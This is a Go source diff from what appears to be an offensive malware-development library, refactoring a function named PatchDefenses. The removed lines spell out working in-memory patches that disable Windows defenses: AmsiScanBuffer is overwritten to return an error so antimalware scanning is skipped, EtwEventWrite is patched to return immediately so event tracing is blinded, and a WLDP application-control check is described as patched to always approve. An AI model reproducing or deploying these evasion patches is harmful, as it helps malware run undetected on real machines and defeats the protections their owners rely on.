@@ -7,6 +7,8 @@ import (
 
 	"golang.org/x/sys/windows"
 
+	"github.com/oioio-space/maldev/evasion/amsi"
+	"github.com/oioio-space/maldev/evasion/etw"
 	"github.com/oioio-space/maldev/win/api"
 	winver "github.com/oioio-space/maldev/win/version"
 )
@@ -68,40 +70,14 @@ func PatchDefenses() error {
 	})
 }
 
-// patchAMSI patches AmsiScanBuffer to return E_INVALIDARG.
+// patchAMSI delegates to the canonical evasion/amsi package.
 func patchAMSI() error {
-	amsi, err := windows.LoadDLL("amsi.dll")
-	if err != nil {
-		return fmt.Errorf("LoadDLL: %w", err)
-	}
-	defer amsi.Release()
-
-	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
-	if err != nil {
-		return fmt.Errorf("FindProc: %w", err)
-	}
-
-	// mov eax, 0x80070057; ret
-	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
-	return api.PatchMemory(amsiScanBuffer.Addr(), patch)
+	return amsi.PatchScanBuffer(nil)
 }
 
-// patchETW patches EtwEventWrite to return success immediately.
+// patchETW delegates to the canonical evasion/etw package.
 func patchETW() error {
-	ntdll, err := windows.LoadDLL("ntdll.dll")
-	if err != nil {
-		return fmt.Errorf("LoadDLL: %w", err)
-	}
-	defer ntdll.Release()
-
-	etwEventWrite, err := ntdll.FindProc("EtwEventWrite")
-	if err != nil {
-		return fmt.Errorf("FindProc: %w", err)
-	}
-
-	// xor eax, eax; ret
-	patch := []byte{0x33, 0xC0, 0xC3}
-	return api.PatchMemory(etwEventWrite.Addr(), patch)
+	return etw.PatchETW(nil)
 }
 
 // patchWLDP patches WldpIsClassInApprovedList to always return true.
